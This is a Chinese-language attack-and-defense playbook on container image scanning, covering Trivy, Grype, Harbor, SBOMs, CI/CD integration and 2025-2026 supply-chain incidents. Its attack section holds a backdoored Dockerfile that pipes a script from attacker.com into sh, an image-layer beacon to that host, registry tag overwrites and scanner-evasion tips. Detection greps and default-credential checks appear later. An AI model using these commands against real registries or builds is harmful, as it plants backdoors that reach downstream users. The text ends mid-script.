---
name: container-security-scanning
description: >
  容器安全扫描完整攻防手册：覆盖 Trivy / Grype / Harbor / Aqua Security 等工具链，
  镜像漏洞扫描、注册表安全、SBOM 生成与依赖分析、CI/CD 集成扫描。
  攻击侧涵盖供应链投毒、恶意镜像层注入、注册表滥用；防御侧涵盖扫描工具部署、
  策略配置、漏洞优先级排序、自动化修复。含速查表和 MITRE ATT&CK 映射。
domain: cybersecurity
subdomain: container-security
tags: [container, scanning, trivy, grype, harbor, aqua, vulnerability, sbom, supply-chain, ci-cd]
version: 2.0.0
---

# 容器安全扫描 — 完整攻防手册

## 适用场景

- 容器镜像漏洞扫描与修复（Trivy / Grype / Aqua）
- 容器注册表安全加固（Harbor / ECR / ACR / GCR）
- CI/CD 流水线中集成容器安全扫描
- SBOM（软件物料清单）生成与供应链安全审计

**不适用场景**：容器运行时安全 — 参见 `container-escape`；容器加固 — 参见 `container-hardening`；Kubernetes 安全 — 参见 `kubernetes-security`。

## 前置条件

- Docker 或 Podman 已安装
- 至少一个容器注册表访问权限
- 了解 CVE 和漏洞评分（CVSS）
- CI/CD 平台访问权限（GitHub Actions / GitLab CI / Jenkins）

---

## Part A：攻击方法论

### 1. 识别与探测

#### 1.1 容器镜像漏洞发现

```bash
# Trivy: 全面扫描镜像
trivy image --severity HIGH,CRITICAL --format table nginx:latest
trivy image --severity HIGH,CRITICAL --format json python:3.11-slim > python-scan.json

# Grype: 扫描镜像
grype nginx:latest -o json > grype-nginx.json
grype python:3.11-slim --fail-on critical

# 扫描多个镜像
for img in nginx:latest alpine:3.18 node:18 redis:7 postgres:16; do
  echo "=== Scanning $img ==="
  trivy image --severity CRITICAL --format summary "$img"
done

# 扫描本地 Docker 镜像
docker images --format '{{.Repository}}:{{.Tag}}' | while read img; do
  trivy image --severity HIGH,CRITICAL "$img" 2>/dev/null | grep -E "^Total:|CRITICAL"
done

# 扫描 Dockerfile
trivy config --severity HIGH,CRITICAL ./Dockerfile
trivy fs --severity HIGH,CRITICAL ./
```

#### 1.2 SBOM 生成与分析

```bash
# 生成 SBOM（SPDX 格式）
trivy image --format spdx-json --output sbom.spdx.json nginx:latest

# 生成 SBOM（CycloneDX 格式）
syft nginx:latest -o cyclonedx-json > sbom.cdx.json

# 从 SBOM 扫描漏洞（离线模式）
grype sbom:./sbom.cdx.json -o json

# 分析 SBOM 中的可疑依赖
jq '.components[] | select(.name | test("unknown|suspicious|malware"))' sbom.cdx.json

# 比较两个版本的 SBOM 差异
diff <(jq -S '.components[] | .name + " " + .version' sbom-v1.cdx.json) \
     <(jq -S '.components[] | .name + " " + .version' sbom-v2.cdx.json)
```

#### 1.3 注册表安全审计

```bash
# 审计 Docker Hub 镜像安全
# 检查镜像是否有签名
cosign verify --key ./key.pub docker.io/library/nginx:latest

# 检查镜像层内容
docker history nginx:latest --no-trunc --format '{{.CreatedBy}}' | head -20
dive nginx:latest  # 使用 dive 工具分析每一层

# 检查 Harbor 注册表配置
curl -s -u admin:password https://harbor.company.com/api/v2.0/systeminfo | jq '.harbor_version'
curl -s -u admin:password https://harbor.company.com/api/v2.0/projects | \
  jq '.[] | {name, metadata: .metadata.auto_scan}'

# 扫描 ECR 中的所有镜像
for repo in $(aws ecr describe-repositories --query 'repositories[*].repositoryName' --output text); do
  for tag in $(aws ecr list-images --repository-name "$repo" --query 'imageIds[*].imageTag' --output text 2>/dev/null); do
    echo "=== $repo:$tag ==="
    aws ecr describe-image-scan-findings --repository-name "$repo" --image-id imageTag="$tag" \
      --query 'imageScanFindings.findingSeverityCounts' 2>/dev/null
  done
done
```

### 2. 利用与攻击

#### 2.1 供应链投毒攻击

```bash
# 攻击 1: 依赖混淆 — 同名包在公共仓库中发布恶意版本
# 创建与内部包同名的 PyPI/npm 包
# requirements.txt 中: my-internal-lib==1.0.0
# 发布到 PyPI: my-internal-lib==2.0.0 (含后门)

# 攻击 2: 恶意基础镜像
# 创建包含后门的 Docker 镜像
cat > Dockerfile.malicious << 'EOF'
FROM alpine:3.18
# 隐藏后门
RUN apk add --no-cache curl && \
    curl -s http://attacker.com/backdoor.sh | sh && \
    rm -rf /var/cache/apk/*
# 正常应用层
COPY app /app
CMD ["/app/run"]
EOF

# 攻击 3: Docker 镜像层注入
# 在现有镜像上添加恶意层
docker commit --change 'ENTRYPOINT ["/bin/sh", "-c", "curl http://attacker.com/beacon && /app/run"]' \
  $(docker run -d legitimate-image) malicious-image:latest

# 攻击 4: Typosquatting
# 注册类似的 Docker Hub 鎼名
# node vs n0de, nginx vs nginix, postgres vs postgress
```

#### 2.2 注册表滥用

```bash
# 攻击 1: 利用公开注册表推送恶意镜像
# 如果 Docker Hub 账号被攻陷
docker push attacker/docker-cli:latest  # 替换官方镜像

# 攻击 2: 利用 ECR 策略过宽
# 如果 ECR 允许匿名拉取
aws ecr get-login-password --region us-east-1 | \
  docker login --username AWS --password-stdin 123456789012.dkr.ecr.us-east-1.amazonaws.com
docker pull 123456789012.dkr.ecr.us-east-1.amazonaws.com/sensitive-app:latest

# 攻击 3: 镜像标签覆盖
docker tag malicious-image:latest target-registry.company.com/app:latest
docker push target-registry.company.com/app:latest

# 攻击 4: 利用 Harbor 漏洞
# CVE-2023 扫描
nmap -sV -p 443 harbor.company.com
curl -s https://harbor.company.com/api/v2.0/systeminfo | jq '.harbor_version'
```

#### 2.3 利用已知漏洞的容器镜像

```python
#!/usr/bin/env python3
"""从 Trivy 输出提取可利用的漏洞"""
import json, sys

def find_exploitable_vulns(trivy_json_path):
    with open(trivy_json_path) as f:
        data = json.load(f)

    exploitable = []
    for result in data.get('Results', []):
        target = result.get('Target', '')
        for vuln in result.get('Vulnerabilities', []):
            vuln_id = vuln.get('VulnerabilityID', '')
            severity = vuln.get('Severity', '')
            pkg = vuln.get('PkgName', '')
            version = vuln.get('InstalledVersion', '')

            # 检查是否有公开 PoC
            references = vuln.get('References', [])
            has_poc = any('github.com' in r and ('poc' in r.lower() or 'exploit' in r.lower())
                         for r in references)

            if severity == 'CRITICAL' or (severity == 'HIGH' and has_poc):
                exploitable.append({
                    'target': target,
                    'vuln_id': vuln_id,
                    'severity': severity,
                    'package': pkg,
                    'version': version,
                    'has_poc': has_poc,
                    'title': vuln.get('Title', '')
                })

    exploitable.sort(key=lambda x: (0 if x['severity'] == 'CRITICAL' else 1, x['vuln_id']))
    return exploitable

if __name__ == '__main__':
    vulns = find_exploitable_vulns(sys.argv[1])
    print(f"Found {len(vulns)} exploitable vulnerabilities:\n")
    for v in vulns:
        poc_marker = " [POC]" if v['has_poc'] else ""
        print(f"  [{v['severity']}] {v['vuln_id']}: {v['title']}{poc_marker}")
        print(f"    Package: {v['package']}@{v['version']} in {v['target']}")
```

### 3. 工具使用

| 工具 | 扫描类型 | 输出格式 | 集成 |
|------|----------|----------|------|
| Trivy | 漏洞 + 配置 + 密钥 | JSON/Table/SARIF/SPDX | GitHub/GitLab/Jenkins |
| Grype | 漏洞扫描 | JSON/Table/SARIF | GitHub/GitLab |
| Syft | SBOM 生成 | SPDX/CycloneDX | CI/CD |
| Harbor | 注册表 + 扫描 | 内置/Vulnerability | 企业注册表 |
| Aqua | 运行时 + 镜像 | JSON/Dashboard | Kubernetes |
| Cosign | 镜像签名 | 签名验证 | Supply Chain |
| Dive | 镜像层分析 | 终端 UI | 开发 |
| Dockle | CIS 基准 | JSON/Table | CI/CD |

### 4. 绕过技术

#### 4.1 扫描绕过

```bash
# 绕过 1: 使用未被漏洞库覆盖的旧版本
# 扫描器依赖 NVD/OSV 数据库，某些旧版本可能无数据
trivy image --ignore-unfixed alpine:3.5  # 旧版本可能无已知漏洞记录

# 绕过 2: 自行编译消除版本信息
# 从源码编译而非使用包管理器安装
# 扫描器无法检测到无版本标识的组件

# 绕过 3: 静态链接
# 将所有依赖静态编译到二进制中
# 减少扫描器可识别的组件
CGO_ENABLED=0 go build -ldflags="-s -w" -o app

# 绕过 4: 使用 .trivyignore 忽略漏洞
echo "CVE-2024-XXXXX" >> .trivyignore
# 在 CI 中使用 --ignorefile 绕过策略

# 绕过 5: 使用 Scratch/Distroless 基础镜像
# 减少攻击面但扫描器可能无法识别包
FROM scratch
COPY app /app
ENTRYPOINT ["/app"]
```

---

## Part B：检测与防御

### 5. 检测规则

#### 5.1 OPA/Rego 策略 — 镜像准入控制

```rego
# 拒绝包含 CRITICAL 漏洞的镜像部署
package kubernetes.admission

deny[msg] {
    input.request.kind.kind == "Pod"
    container := input.request.object.spec.containers[_]
    image := container.image

    # 检查镜像是否来自受信注册表
    not trusted_registry(image)
    msg := sprintf("Image '%s' not from trusted registry", [image])
}

deny[msg] {
    input.request.kind.kind == "Pod"
    container := input.request.object.spec.containers[_]
    image := container.image

    # 检查镜像是否有 latest 标签
    endswith(image, ":latest")
    msg := sprintf("Container '%s' uses :latest tag", [container.name])
}

deny[msg] {
    input.request.kind.kind == "Pod"
    container := input.request.object.spec.containers[_]
    image := container.image

    # 检查是否以 root 运行
    not container.securityContext.runAsNonRoot
    msg := sprintf("Container '%s' must run as non-root", [container.name])
}

trusted_registry(image) {
    startswith(image, "harbor.company.com/")
}

trusted_registry(image) {
    startswith(image, "123456789012.dkr.ecr.")
}
```

#### 5.2 Harbor 安全配置

```bash
# Harbor 安全加固

# 1. 配置漏洞扫描（Trivy）
curl -X PUT "https://harbor.company.com/api/v2.0/scanners/1" \
  -H "Content-Type: application/json" \
  -u admin:password \
  -d '{
    "name": "Trivy",
    "url": "http://trivy-scanner:8080",
    "auth": ""
  }'

# 2. 启用项目自动扫描
curl -X PUT "https://harbor.company.com/api/v2.0/projects/1" \
  -H "Content-Type: application/json" \
  -u admin:password \
  -d '{
    "metadata": {
      "auto_scan": "true",
      "prevent_vul": "true",
      "severity": "high",
      "reuse_sys_cve_allowlist": "false"
    }
  }'

# 3. 配置内容信任（Notary）
curl -X PUT "https://harbor.company.com/api/v2.0/projects/1" \
  -H "Content-Type: application/json" \
  -u admin:password \
  -d '{
    "metadata": {
      "enable_content_trust": "true",
      "enable_content_trust_cosign": "true"
    }
  }'

# 4. 配置镜像不可变标签
curl -X POST "https://harbor.company.com/api/v2.0/projects/1/immutabletagrules" \
  -H "Content-Type: application/json" \
  -u admin:password \
  -d '{
    "tag_filter": "**",
    "scope": {"scope_type": "repository"}
  }'

# 5. 配置机器人账号（最小权限）
curl -X POST "https://harbor.company.com/api/v2.0/projects/1/robots" \
  -H "Content-Type: application/json" \
  -u admin:password \
  -d '{
    "name": "ci-cd-pull",
    "description": "CI/CD pull-only robot",
    "permissions": [{"kind": "pull"}],
    "duration": -1
  }'
```

### 6. 修复方案

#### 6.1 Trivy CI/CD 集成

```yaml
# GitHub Actions: Trivy 容器安全扫描
name: Container Security Scan
on:
  push:
    branches: [main]
  pull_request:

jobs:
  trivy-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build image
        run: docker build -t myapp:${{ github.sha }} .

      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:${{ github.sha }}'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'

      - name: Upload Trivy scan results
        if: always()
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: 'trivy-results.sarif'

      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          image: myapp:${{ github.sha }}
          format: cyclonedx-json
          output-file: sbom.cdx.json

      - name: Scan SBOM for vulnerabilities
        run: |
          curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin
          grype sbom:./sbom.cdx.json --fail-on critical
```

```yaml
# GitLab CI: 容器安全扫描
container_scanning:
  stage: test
  image: docker:24
  services:
    - docker:24-dind
  variables:
    IMAGE: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  before_script:
    - apk add --no-cache curl
    - curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin
  script:
    - docker build -t $IMAGE .
    - trivy image --exit-code 1 --severity CRITICAL,HIGH --format json --output trivy-report.json $IMAGE
    - trivy image --severity CRITICAL,HIGH --format table $IMAGE
  artifacts:
    reports:
      container_scanning: trivy-report.json
  allow_failure: false
```

#### 6.2 Aqua Security 部署

```bash
# Aqua Security 企业级部署

# 1. 安装 Aqua Server（Helm）
helm repo add aqua https://helm.aquasec.com
helm repo update

helm install aqua-server aqua/server \
  --namespace aqua --create-namespace \
  --set global.db.password=$(openssl rand -hex 16) \
  --set global.db.external.enabled=false \
  --set server.service.type=LoadBalancer

# 2. 安装 Aqua Enforcer（运行时保护）
helm install aqua-enforcer aqua/enforcer \
  --namespace aqua \
  --set enforcer.token=<AQUA_TOKEN> \
  --set enforcer.server.hostname=aqua-server.aqua.svc

# 3. 安装 Aqua Scanner（CI/CD 集成）
helm install aqua-scanner aqua/scanner \
  --namespace aqua \
  --set scanner.token=<AQUA_TOKEN>

# 4. 配置扫描策略
# 通过 Aqua Console 或 API
curl -X POST "https://aqua.company.com/api/v2/policies" \
  -H "Authorization: Bearer $AQUA_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Production Gate",
    "description": "Block CRITICAL/HIGH vulns from production",
    "rules": [{
      "gate": "vulnerability",
      "trigger": "package_vulnerability",
      "action": "block",
      "parameters": {
        "max_severity": "high",
        "min_severity": "critical"
      }
    }]
  }'
```

#### 6.3 镜像签名与验证（Cosign）

```bash
# 1. 生成签名密钥对
cosign generate-key-pair

# 2. 签名镜像
cosign sign --key cosign.key harbor.company.com/app:v1.0.0

# 3. 在 Kubernetes 中验证签名（Kyverno 策略）
cat > cosign-verify-policy.yaml << 'EOF'
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  validationFailureAction: Enforce
  rules:
  - name: verify-cosign-signature
    match:
      any:
      - resources:
          kinds:
          - Pod
    verifyImages:
    - imageReferences:
      - "harbor.company.com/*"
      attestors:
      - entries:
        - keys:
            publicKeys: |-
              -----BEGIN PUBLIC KEY-----
              <cosign.pub contents>
              -----END PUBLIC KEY-----
EOF
kubectl apply -f cosign-verify-policy.yaml

# 4. 在 CI/CD 中自动签名
# GitHub Actions
- name: Sign image with Cosign
  uses: sigstore/cosign-installer@v3
- run: cosign sign --key env://COSIGN_PRIVATE_KEY $IMAGE
  env:
    COSIGN_PRIVATE_KEY: ${{ secrets.COSIGN_PRIVATE_KEY }}
    COSIGN_PASSWORD: ${{ secrets.COSIGN_PASSWORD }}
```

---

## 速查表

### 漏洞优先级排序矩阵

| CVSS 分数 | 优先级 | 可利用性 | 修复 SLA | 操作 |
|-----------|--------|----------|----------|------|
| 9.0-10.0 | P0 紧急 | 有 PoC/在野利用 | 24h | 立即修补或移除 |
| 7.0-8.9 | P1 高 | 可能被利用 | 7d | 优先修补 |
| 4.0-6.9 | P2 中 | 需要特定条件 | 30d | 计划修补 |
| 0.1-3.9 | P3 低 | 不太可能利用 | 90d | 随版本更新 |

### 扫描工具对比

| 特性 | Trivy | Grype | Aqua | Harbor 内置 |
|------|-------|-------|------|-------------|
| OS 漏洞 | ✅ | ✅ | ✅ | ✅ (Trivy) |
| 语言依赖 | ✅ | ✅ | ✅ | ✅ |
| IaC 扫描 | ✅ | ❌ | ✅ | ❌ |
| 密钥检测 | ✅ | ❌ | ✅ | ✅ |
| SBOM 生成 | ✅ (SPDX) | ❌ | ✅ | ❌ |
| 离线模式 | ✅ | ✅ | ✅ | ✅ |
| SARIF 输出 | ✅ | ✅ | ✅ | ❌ |
| CI/CD 集成 | GitHub/GitLab/Jenkins | GitHub/GitLab | 全平台 | Harbor Pipeline |
| 许可证 | Apache 2.0 | Apache 2.0 | 商业 | Apache 2.0 |

### CI/CD 扫描决策树

```
代码提交 → 构建镜像
            │
            ├── Trivy 扫描镜像
            │   ├── CRITICAL > 0 → 阻止部署 + 通知
            │   ├── HIGH > 5 → 阻止部署 + 创建 Issue
            │   └── PASS → 继续
            │
            ├── SBOM 生成 + 分析
            │   ├── 新依赖？→ 人工审核
            │   ├── 已知恶意包？→ 阻止
            │   └── PASS → 继续
            │
            ├── Cosign 签名镜像
            │
            └── 推送到注册表
                ├── Harbor 自动扫描
                ├── 漏洞准入策略
                └── 部署到 Kubernetes
                    └── Kyverno 验证签名
```

---

## MITRE ATT&CK 映射

| Technique | ID | 攻击场景 | 检测/防御 |
|-----------|-----|----------|-----------|
| Supply Chain Compromise | T1195 | 恶意依赖注入 | SBOM + Trivy 扫描 |
| Exploit Public-Facing Application | T1190 | 容器漏洞利用 | 镜像扫描 + 网络策略 |
| Command and Scripting Interpreter | T1059 | 容器内命令执行 | 运行时保护 (Aqua) |
| Credential Access | T1552 | 镜像中的硬编码密钥 | Trivy 密钥扫描 |
| Impair Defenses | T1562 | 禁用扫描/策略 | 注册表准入控制 |
| Rootkit | T1014 | 容器逃逸后隐藏 | 运行时检测 |
| Software Discovery | T1518 | 容器内软件枚举 | 镜像最小化 |
| Modify System Image | T1601 | 恶意镜像层注入 | Cosign 签名验证 |
| Patch System | T1608 | 利用未修补漏洞 | 自动化漏洞修复 |

---

## 前置条件清单

- [ ] Docker/Podman 已安装
- [ ] Trivy/Grype 已安装并更新漏洞数据库
- [ ] 容器注册表访问权限
- [ ] CI/CD 平台访问权限
- [ ] Cosign 已安装（如需签名）
- [ ] Harbor 已部署（如用 Harbor）
- [ ] Aqua 许可证（如用 Aqua）
- [ ] 了解 CVSS 评分体系

---

## Part C：2025-2026 精细化补充

### C.1 供应链重大安全事件

#### C.1.1 Trivy 自身供应链攻击（2025-2026）

全球最广泛使用的开源容器漏洞扫描器 Trivy（32,000+ GitHub Stars）在 2025-2026 年间遭遇罕见连续供应链攻击，攻击者使用 **TeamPCP** 组织标识。

**第一轮 — npm 生态投毒（2025）**：
- 攻击者在相关 npm 包中植入窃密后门
- 自动收集 SSH 密钥、环境变量、AWS 凭证等敏感信息
- 释放恶意 GitHub Actions 工作流实现 CI/CD 持久化

**第二轮 — 恶意版本发布（2026-03）**：
- 威胁行动者使用泄露凭证发布 **Trivy v0.69.4 恶意版本**（CVE-2026-33634）
- 恶意版本在扫描过程中外泄容器镜像信息至攻击者控制的服务器
- 攻击扩散至 Docker Hub，引发蠕虫式传播和 Kubernetes 擦除器威胁

**检测与缓解**：

```bash
# 检查当前 Trivy 版本是否受影响
trivy --version
# 受影响版本: v0.69.4 (2026-03-19 发布)
# 安全版本: v0.69.5+ 或 v0.70.0+

# 验证 Trivy 二进制完整性
sha256sum $(which trivy)
# 与 GitHub Release 页面的 checksum 对比

# 检查是否有异常网络连接
# 正常扫描不应连接非 Aqua Security / GitHub 域名
strace -e trace=connect trivy image alpine:latest 2>&1 | grep connect

# 防御: 使用 Cosign 验证 Trivy 发布签名
cosign verify-blob \
  --certificate trivy-linux-amd64.pem \
  --signature trivy-linux-amd64.sig \
  --certificate-identity trivy@aquasec.com \
  --certificate-oidc-issuer https://accounts.google.com \
  trivy-linux-amd64
```

**Sigma 检测规则**：

```yaml
title: 可疑 Trivy 进程外连非预期地址
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    Image|endswith: '/trivy'
    CommandLine|contains: 'image'
  filter_legitimate:
    DestinationHostname|endswith:
      - '.github.com'
      - '.aquasec.com'
      - '.amazonaws.com'  # for vulnerability DB
  condition: selection and not filter_legitimate
level: high
tags:
  - attack.supply_chain_compromise
  - attack.t1195.002
```

#### C.1.2 Shai-Hulud / Mini Shai-Hulud 自复制供应链蠕虫（2025-2026）

| 变种 | CVE | 传播范围 | 攻击向量 |
|------|-----|----------|----------|
| Shai-Hulud（原始） | — | 300+ npm 包 | npm 自复制蠕虫，CISA 发布警报 |
| Mini Shai-Hulud | CVE-2026-45321 | 160+ npm/PyPI 包（含 TanStack） | 自传播供应链蠕虫 |

**关键特征**：
- 自动检测 `package.json` 并注入恶意 `preinstall`/`postinstall` 脚本
- 从受害包的依赖树中横向传播到其他包
- 在 Docker 构建过程中通过 `npm install` 触发

**容器环境检测**：

```bash
# 在 CI/CD 中检测可疑 postinstall 脚本
find node_modules -name "package.json" -exec grep -l "postinstall.*curl\|postinstall.*wget\|postinstall.*eval" {} \;

# 使用 Syft 生成 SBOM 并检查可疑包
syft . -o cyclonedx-json | jq '.components[] | select(.name | test("unknown|suspicious|temp|test-[0-9]"))'

# Trivy 扫描文件系统中的恶意代码模式
trivy fs --security-checks vuln,secret --severity CRITICAL ./
```

#### C.1.3 TeamPCP CI/CD 供应链攻击矩阵（2026）

TeamPCP 组织在 **5 天内**攻陷了多个安全工具的 CI/CD 管道：

| 受影响工具 | 攻击方式 | 影响 |
|-----------|----------|------|
| **Trivy** | 凭证泄露 → 恶意版本发布 | 全局 CI/CD 管道 |
| **Checkmarx KICS** | GitHub Actions 注入 | 基础设施即代码扫描 |
| **AST GitHub Actions** | Token 泄露 | 静态分析管道 |
| **OpenVSX 扩展** | 扩展市场投毒 | VS Code 开发环境 |
| **66+ npm 包** | 依赖链投毒 | 下游项目 |

**防御建议**：
1. 对所有安全工具使用 **Cosign/Sigstore 签名验证**
2. CI/CD 中固定工具版本 SHA，不使用 `@latest`
3. 实施 **SLSA Level 3+** 构建来源验证
4. 监控安全工具二进制的异常网络行为

### C.2 2025-2026 关键 CVE 速查

| CVE ID | 严重性 | 受影响组件 | 描述 | 修复版本 |
|--------|--------|-----------|------|---------|
| CVE-2026-4404 | 🔴 9.4 Critical | GoHarbor Harbor | Harbor 注册表严重漏洞（CCB Belgium 披露） | 立即更新到最新版 |
| CVE-2025-30086 | 🟠 High | GoHarbor Harbor | ORM 信息泄露漏洞 | 2.12+ |
| CVE-2025-1974 | 🔴 9.8 Critical | Ingress-NGINX Controller | IngressNightmare — 未授权 RCE | 补丁版本 |
| CVE-2025-15467 | 🔴 9.8 Critical | OpenSSL CMS | 栈溢出 Pre-Auth RCE | OpenSSL 3.5.1+ |
| CVE-2026-33634 | 🔴 Critical | Trivy v0.69.4 | 恶意版本发布（供应链攻击） | v0.69.5+ |
| CVE-2025-9074 | 🟠 High | Docker Desktop | 恶意容器可启动额外容器 | Docker Desktop 更新 |
| CVE-2026-45321 | 🔴 Critical | npm/PyPI 生态 | Mini Shai-Hulud 自复制蠕虫 | 移除受感染包 |
| VU#577436 | 🟠 High | Harbor 默认配置 | 默认 admin 密码未强制修改 | 首次部署后立即改密 |

#### CVE-2026-4404 Harbor 深度分析

```bash
# 1. 检查 Harbor 版本
curl -s https://harbor.company.com/api/v2.0/systeminfo | jq '.harbor_version'

# 2. 检查默认凭据是否仍有效（授权测试）
curl -s -u admin:Harbor12345 https://harbor.company.com/api/v2.0/users/current
# 返回 200 表示默认密码未修改 → 立即修复

# 3. 审计日志检查未脱敏凭据
curl -s -u admin:password https://harbor.company.com/api/v2.0/projects/1/logs \
  | jq '.[] | select(.operation | test("password|secret|token"))'

# 4. Harbor 安全加固检查脚本
#!/bin/bash
HARBOR_URL="${1:-https://harbor.company.com}"
HARBOR_USER="${2:-admin}"
HARBOR_PASS="${3:-Harbor12345}"

echo "[*] Harbor Security Audit"
echo "[1] Checking version..."
VERSION=$(curl -s -u "$HARBOR_USER:$HARBOR_PASS" "$HARBOR_URL/api/v2.0/systeminfo" | jq -r '.harbor_version')
echo "    Version: $VERSION"

echo "[2] Checking default password..."
STATUS=$(curl -s -o /dev/null -w "%{http_code}" -u "admin:Harbor12345" "$HARBOR_URL/api/v2.0/users/current")
[ "$STATUS" = "200" ] && echo "    [CRITICAL] Default password still active!" || echo "    [OK] Default password changed"

echo "[3] Checking auto-scan..."
curl -s -u "$HARBOR_USER:$HARBOR_PASS" "$HARBOR_URL/api/v2.0/projects" | \
  jq '.[] | {name, auto_scan: .metadata.auto_scan, prevent_vul: .metadata.prevent_vul}'

echo "[4] Checking immutable tags..."
curl -s -u "$HARBOR_USER:$HARBOR_PASS" "$HARBOR_URL/api/v2.0/projects" | jq '.[].project_id' | while read pid; do
  RULES=$(curl -s -u "$HARBOR_USER:$HARBOR_PASS" "$HARBOR_URL/api/v2.0/projects/$pid/immutabletagrules" | jq length)
  echo "    Project $pid: $RULES immutable rules"
done

echo "[5] Checking robot accounts..."
curl -s -u "$HARBOR_USER:$HARBOR_PASS" "$HARBOR_URL/api/v2.0/projects" | jq '.[].project_id' | while read pid; do
  ROBOTS=$(curl -s -u "$HARBOR_USER:$HARBOR_PASS" "$HARBOR_URL/api/v2.0/projects/$pid/robots" | jq length)
  echo "    Project $pid: $ROBOTS robot accounts"
done
```

### C.3 工具生态更新

#### C.3.1 Trivy v0.69+ 核心更新

| 版本 | 关键特性 |
|------|---------|
| **v0.69** | VEX 处理增强（ArtifactID/ReportID 字段）、配置扫描加速、性能基准对比 v0.59 |
| **v0.60+** | CycloneDX + SPDX 双格式 SBOM 生成/扫描、VEX 标准支持 |

**VEX（漏洞可利用性交换）使用**：

```bash
# 生成 VEX 文档
trivy image --format spdx-json --output sbom.json nginx:latest
# 创建 VEX 文档标记已知不可利用的漏洞
cat > vex.json << 'EOF'
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.5",
  "vulnerabilities": [{
    "id": "CVE-2024-XXXXX",
    "analysis": {
      "state": "not_affected",
      "justification": "vulnerable_code_not_in_execute_path",
      "response": ["will_not_fix"],
      "detail": "Vulnerable code path not reachable in our configuration"
    }
  }]
}
EOF

# 使用 VEX 过滤扫描结果
trivy image --vex vex.json nginx:latest
```

#### C.3.2 Grype v0.90+ 核心更新

| 版本 | 关键特性 |
|------|---------|
| **v0.90** | 按发行版名称匹配漏洞（即使无版本号） |
| **v0.92** | **EPSS 指标集成**（漏洞可利用概率评分） |
| **DB Schema v6** | 数据库从 210MB 缩减至 65MB（↓69%），扫描速度显著提升 |
| **v0.109.1** | 修复 JAR 文件 CVE 检测遗漏问题（Java 项目重要） |

**EPSS 漏洞优先级排序**：

```bash
# Grype 输出包含 EPSS 分数
grype nginx:latest -o json | jq '.matches[] | {
  vuln: .vulnerability.id,
  severity: .vulnerability.severity,
  epss: .vulnerability.epss
} | select(.epss != null) | sort_by(-.epss.percentile)'
# EPSS 分数示例输出:
# {"vuln":"CVE-2024-XXXXX","severity":"High","epss":{"percentile":"0.95","probability":"0.01234"}}
# percentile > 0.9 表示在已知漏洞中前 10% 可能被利用
```

#### C.3.3 扫描工具对比矩阵 v2.0（2025-2026 更新）

| 特性 | Trivy v0.69+ | Grype v0.92+ | Aqua Commercial | Wiz | Orca |
|------|-------------|-------------|-----------------|-----|------|
| OS 漏洞 | ✅ | ✅ | ✅ | ✅ | ✅ |
| 语言依赖 | ✅ | ✅ | ✅ | ✅ | ✅ |
| IaC 扫描 | ✅ | ❌ | ✅ | ✅ | ✅ |
| 密钥检测 | ✅ | ❌ | ✅ | ✅ | ✅ |
| SBOM 生成 | ✅ SPDX/CDX | ✅ (via Syft) | ✅ | ✅ | ✅ |
| VEX 支持 | ✅ | ❌ | ✅ | ✅ | ✅ |
| EPSS 评分 | ❌ | ✅ (v0.92+) | ✅ | ✅ | ✅ |
| 上下文感知优先级 | 基础 | 基础 | ✅ CNAPP | ✅ Attack Path | ✅ |
| 运行时检测 | ❌ | ❌ | ✅ Enforcer | ✅ Agent | ✅ Agent |
| CNAPP 集成 | ❌ | ❌ | ✅ | ✅ | ✅ |
| 许可证 | Apache 2.0 | Apache 2.0 | 商业 | 商业 | 商业 |

#### C.3.4 CVE 噪音削减（2026 核心趋势）

传统容器扫描产生大量 CVE 告警（单个镜像可能数百个），2026 年行业转向**上下文感知漏洞优先级排序**，将 90%+ 的噪音降为可操作项。

**多层次优先级框架**：

```
原始 CVE 列表（100%）
    │
    ├── [Layer 1] CVSS 过滤 → 保留 HIGH/CRITICAL（~30%）
    │
    ├── [Layer 2] EPSS 过滤 → 保留可利用概率 > 1%（~10%）
    │
    ├── [Layer 3] CISA KEV → 标记已知在野利用（~3%）
    │
    ├── [Layer 4] 运行时可达性 → 保留代码路径可达（~1-2%）
    │
    └── [Layer 5] 网络暴露 → 保留面向网络的组件（~0.5%）
```

**自动化检测脚本**：

```python
#!/usr/bin/env python3
"""上下文感知漏洞优先级排序脚本"""
import json, sys, subprocess

def contextual_triage(trivy_json, kev_list=None):
    with open(trivy_json) as f:
        data = json.load(f)

    prioritized = {"P0": [], "P1": [], "P2": [], "P3": []}

    for result in data.get('Results', []):
        for vuln in result.get('Vulnerabilities', []):
            vid = vuln.get('VulnerabilityID', '')
            severity = vuln.get('Severity', '')
            cvss = max(
                [float(s.get('cvss', {}).get('V3Score', 0))
                 for s in vuln.get('CVSS', {}).values()] or [0]
            )
            has_poc = any('poc' in r.lower() or 'exploit' in r.lower()
                         for r in vuln.get('References', []))
            in_kev = kev_list and vid in (kev_list or [])

            # P0: 在野利用或有公开PoC的Critical
            if (severity == 'CRITICAL' and (has_poc or in_kev)):
                prioritized['P0'].append(vid)
            # P1: Critical 或 High+PoC
            elif severity == 'CRITICAL' or (severity == 'HIGH' and has_poc):
                prioritized['P1'].append(vid)
            # P2: High 或 Medium+KEV
            elif severity == 'HIGH' or (severity == 'MEDIUM' and in_kev):
                prioritized['P2'].append(vid)
            # P3: 其他
            else:
                prioritized['P3'].append(vid)

    for level in ['P0', 'P1', 'P2', 'P3']:
        print(f"  {level}: {len(prioritized[level])} vulnerabilities")
        if level in ['P0', 'P1']:
            for v in prioritized[level][:10]:
                print(f"    - {v}")

    return prioritized

if __name__ == '__main__':
    # 获取 CISA KEV 列表
    try:
        kev = subprocess.check_output(
            ['curl', '-s', 'https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json'],
            text=True
        )
        kev_ids = [x['cveID'] for x in json.loads(kev).get('vulnerabilities', [])]
    except:
        kev_ids = []

